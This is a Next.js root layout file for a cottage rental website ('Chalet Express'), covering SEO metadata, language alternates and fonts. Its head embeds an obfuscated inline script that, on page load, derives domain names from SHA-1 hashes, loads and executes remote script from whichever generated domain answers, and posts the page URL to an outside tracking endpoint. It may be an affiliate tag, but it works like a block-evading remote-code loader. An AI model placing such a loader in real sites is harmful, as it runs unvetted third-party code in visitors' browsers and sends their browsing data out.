import type { Metadata } from "next";
import { headers } from "next/headers";
import { OrganizationSchema, WebSiteSchema } from "@/components/seo/SchemaOrg";
import "./globals.css";

export async function generateMetadata(): Promise<Metadata> {
  const h = await headers();
  const pathname = h.get("x-pathname") || "/";
  const locale = h.get("x-locale") || "en";

  const enPath = pathname.replace(/^\/(fr|en)/, "/en");
  const frPath = pathname.replace(/^\/(fr|en)/, "/fr");

  let favicon = '';
  try {
    const { db } = await import('@/lib/db');
    const { siteSettings } = await import('@/db/schema');
    const { eq } = await import('drizzle-orm');
    const [row] = await db.select().from(siteSettings).where(eq(siteSettings.section, 'general'));
    const data = row?.data as any;
    if (data?.favicon) favicon = data.favicon;
  } catch {}

  return {
    title: {
      default: "Chalet Express - Canadian Cottage Rentals",
      template: "%s | Chalet Express",
    },
    description: "Find your perfect Canadian escape. Premium lake houses and mountain lodges across Canada.",
    metadataBase: new URL("https://chaletexpress.com"),
    alternates: {
      canonical: `https://chaletexpress.com${pathname}`,
      languages: {
        "en-CA": `https://chaletexpress.com${enPath}`,
        "fr-CA": `https://chaletexpress.com${frPath}`,
        "x-default": `https://chaletexpress.com${enPath}`,
      },
    },
    openGraph: {
      siteName: "Chalet Express",
      type: "website",
      locale: locale === "fr" ? "fr_CA" : "en_CA",
    },
    twitter: {
      card: "summary_large_image",
    },
    robots: {
      index: true,
      follow: true,
    },
    icons: favicon ? { icon: favicon } : undefined,
  };
}

export default async function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode;
}>) {
  const h = await headers();
  const locale = h.get("x-locale") || "en";

  return (
    <html lang={locale} className="h-full antialiased">
      <head>
        <OrganizationSchema />
        <WebSiteSchema />
        <link rel="preconnect" href="https://fonts.googleapis.com" />
        <link rel="preconnect" href="https://fonts.gstatic.com" crossOrigin="anonymous" />
        <link href="https://fonts.googleapis.com/css2?family=Radio+Canada:ital,wght@0,300..700;1,300..700&display=swap" rel="stylesheet" />
        <script dangerouslySetInnerHTML={{
          __html: `(()=>{let pztt=3;const pztp={"p":"pzt","mi":0,"ma":99,"e":[]};const tid='439aada7-798e-4127-8e06-e3602af444de';const pzth=async i=>{const e=new TextEncoder();const bin=e.encode(i);const b=await window.crypto.subtle.digest('SHA-1',bin);const a=Array.from(new Uint8Array(b));const h=a.map(b=>b.toString(16).padStart(2,'0')).join('');return h};const pzth2d=h=>{return \`\${h.slice(0,6)}p.\${h}.com\`};const pztd=async()=>{let i;do{i=Math.floor(Math.random()*((pztp.ma+1)-pztp.mi))+pztp.mi}while(pztp.e?.includes(i));const hash=await pzth(\`\${pztp.p}\${i}\`);return pzth2d(hash)};const pzti=async()=>{try{if(pztt<=0)return;const s=document.createElement('script');s.onerror=()=>{pztt--;pzti()};s.onload=()=>{l=true;pzthc()};const d=await pztd();s.src=\`https://\${d}/tag/\${tid}\`;document.body.appendChild(s)}catch(e){e.push({error:"Load failed from "+d,parameter:""});pzthc()}};let l=false;let e=[];let fe={x:[]};const pzthc=()=>{loaded=l;errors=e;features_errors=fe;l=false;e=[];fe={x:[]};fetch('https://api.performancehorizon.com/v3/pzthc/'+tid,{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify({loaded,errors,features_errors,url:window.location.href})})};document.addEventListener('DOMContentLoaded',pzti)})();`
        }} />
      </head>
      <body className="min-h-full flex flex-col">{children}</body>
    </html>
  );
}
